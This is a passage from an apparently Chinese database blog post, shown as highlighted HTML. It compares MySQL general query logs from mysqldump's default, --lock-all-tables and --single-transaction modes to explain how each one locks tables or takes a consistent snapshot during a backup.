class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.413782</span>Z	  <span class="number">123</span> Query	<span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.416628</span>Z	  <span class="number">123</span> Query	<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.418387</span>Z	  <span class="number">123</span> Query	<span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.420250</span>Z	  <span class="number">123</span> Init DB	test</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.420786</span>Z	  <span class="number">123</span> Query	<span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `test`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.421379</span>Z	  <span class="number">123</span> Query	<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.422627</span>Z	  <span class="number">123</span> Query	LOCK TABLES `test_table` READ <span class="comment">/*!32311 LOCAL */</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.423269</span>Z	  <span class="number">123</span> Query	<span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;test\_table&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.424678</span>Z	  <span class="number">123</span> Query	<span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.425241</span>Z	  <span class="number">123</span> Query	<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.425818</span>Z	  <span class="number">123</span> Query	<span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.426554</span>Z	  <span class="number">123</span> Query	<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.427116</span>Z	  <span class="number">123</span> Query	<span class="keyword">show</span> fields <span class="keyword">from</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.428382</span>Z	  <span class="number">123</span> Query	<span class="keyword">show</span> fields <span class="keyword">from</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.429591</span>Z	  <span class="number">123</span> Query	<span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test_table`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.430238</span>Z	  <span class="number">123</span> Query	<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.430767</span>Z	  <span class="number">123</span> Query	use `test`</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.431325</span>Z	  <span class="number">123</span> Query	<span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.431900</span>Z	  <span class="number">123</span> Query	<span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;test\_table&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.433084</span>Z	  <span class="number">123</span> Query	<span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.433627</span>Z	  <span class="number">123</span> Query	UNLOCK TABLES</span><br><span class="line"></span><br><span class="line"><span class="number">2022</span><span class="number">-08</span><span class="number">-30</span>T05:<span class="number">10</span>:<span class="number">08.436134</span>Z	  <span class="number">123</span> Quit</span><br></pre></td></tr></table></figure>

<p>​    我们看到，他会将数据库所有的表做LOCK TABLE，所有表导出完成，才会执行UNLOCK TABLES，因此在导出过程中所有的表都禁止操作。</p>
<p>​    还有另外两种办法我们也同时看看好了，开发常用，脱裤无所谓了🥵。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -udumper -pdumper --lock-all-tables <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">31</span>:<span class="number">37.989701</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Query  <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;log_output&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">32</span>:<span class="number">08.981051</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Query  <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">32</span>:<span class="number">39.291966</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1892</span> Quit  </span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.146784</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> <span class="keyword">Connect</span>  root<span class="variable">@localhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.146963</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.147069</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.147165</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  FLUSH TABLES</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.182528</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  FLUSH TABLES <span class="keyword">WITH</span> READ LOCK</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.182675</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.184634</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.192668</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.194757</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196137</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Init DB  test</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196195</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> tables</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196398</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196592</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196634</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196667</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196748</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196808</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197078</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197273</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197395</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197429</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  use `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197462</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197507</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;t\_&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197791</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.458820</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Quit</span><br></pre></td></tr></table></figure>

<p>​    他会在开始，执行一次FLUSH TABLES WITH READ LOCK，在导出完成，退出会话的时候，自动释放读锁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -udumper -pdumper --single-transaction <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>​    在开始执行了SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ，设置了RR隔离级别，并通过START TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */，开启了事务，UNLOCK TABLES解锁了所有的表，我们能注意到，他在执行导出操作前，设置了还原点，SAVEPOINT sp，并且在每张表的导出操作前，都执行了ROLLBACK TO SAVEPOINT sp，回到还原点，通过这种操作，保证了读数据的一致性，导出所有的表，然后再执行了RELEASE SAVEPOINT sp。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423617</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> <span class="keyword">Connect</span>  root<span class="variable">@localhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423747</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423816</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423892</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423940</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">START</span> TRANSACTION <span class="comment">/*!40100 WITH CONSISTENT SNAPSHOT */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.424145</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.426431</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  UNLOCK TABLES</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.426624</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.431603</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.433579</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434791</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Init DB  test</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434852</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434906</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> tables</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435113</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435337</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435388</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435434</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435509</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435567</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435859</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> 